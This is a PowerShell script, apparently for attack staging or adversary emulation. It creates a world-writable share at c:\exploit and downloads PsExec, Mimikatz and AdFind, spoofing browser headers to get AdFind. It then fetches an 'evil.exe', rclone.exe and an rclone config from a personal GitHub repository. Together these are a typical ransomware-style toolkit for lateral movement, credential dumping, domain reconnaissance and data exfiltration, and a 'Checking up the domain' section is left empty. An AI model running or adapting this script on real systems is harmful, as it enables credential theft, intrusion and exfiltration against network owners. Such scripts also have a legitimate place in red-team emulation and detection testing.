"Downloading PsExec"

$staticPath= "c:\exploit"
net share ShareName=$staticPath /grant:Everyone,FULL

$pstoolsUrl = 'https://download.sysinternals.com/files/PSTools.zip'
$outputPath = $staticPath+'\PSTools.zip'
$pstoolsPath = $staticPath+'\PSTools'
Invoke-WebRequest -Uri $pstoolsUrl -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath $pstoolsPath
"Downloading Mimikatz"
$mimikatzUrl = 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip'
$outputPath = $staticPath+'\mimikatz.zip'
$mimikatzPath = $staticPath+'\mimikatz'
Invoke-WebRequest -Uri $mimikatzUrl -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath $mimikatzPath
"Downloading AdFind"
$adfindUrl = "https://www.joeware.net/downloads/dl2.php"
$outputPath = $staticPath+"\adfind.zip"
$adfindPath = $staticPath+"\adfind"
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
Invoke-WebRequest -UseBasicParsing -Uri "https://www.joeware.net/downloads/dl2.php" `
-Method "POST" `
-WebSession $session `
-Headers @{
"Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
  "Cache-Control"="max-age=0"
  "Origin"="https://www.joeware.net"
  "Referer"="https://www.joeware.net/freetools/tools/adfind/"
  "Sec-Fetch-Dest"="document"
  "Sec-Fetch-Mode"="navigate"
  "Sec-Fetch-Site"="same-origin"
  "Sec-Fetch-User"="?1"
  "Upgrade-Insecure-Requests"="1"
  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"macOS`""
} `
-ContentType "application/x-www-form-urlencoded" `
-Body "download=AdFind.zip&email=&B1=Download+Now" -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath $adfindPath


"Checking up the domain"



"downloading evil.exe"
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/evil.exe" `
-WebSession $session `
-Headers @{
"Accept"="*/*"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
  "Origin"="https://github.com"
  "Referer"="https://github.com/DolevAttiya/lol/blob/main/evil.exe"
  "Sec-Fetch-Dest"="empty"
  "Sec-Fetch-Mode"="cors"
  "Sec-Fetch-Site"="cross-site"
  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"macOS`""
} -OutFile c:\exploit\evil.exe
Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/rclone.exe" `
-WebSession $session `
-Headers @{
"Accept"="*/*"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
  "Origin"="https://github.com"
  "Referer"="https://github.com/DolevAttiya/lol/blob/main/evil.exe"
  "Sec-Fetch-Dest"="empty"
  "Sec-Fetch-Mode"="cors"
  "Sec-Fetch-Site"="cross-site"
  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"macOS`""
} -OutFile c:\exploit\rclone.exe
Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/rclone.conf" `
-WebSession $session `
-Headers @{
"Accept"="*/*"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
  "Origin"="https://github.com"
  "Referer"="https://github.com/DolevAttiya/lol/blob/main/evil.exe"
  "Sec-Fetch-Dest"="empty"
  "Sec-Fetch-Mode"="cors"
  "Sec-Fetch-Site"="cross-site"
  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"macOS`""
} -OutFile c:\exploit\rclone.conf
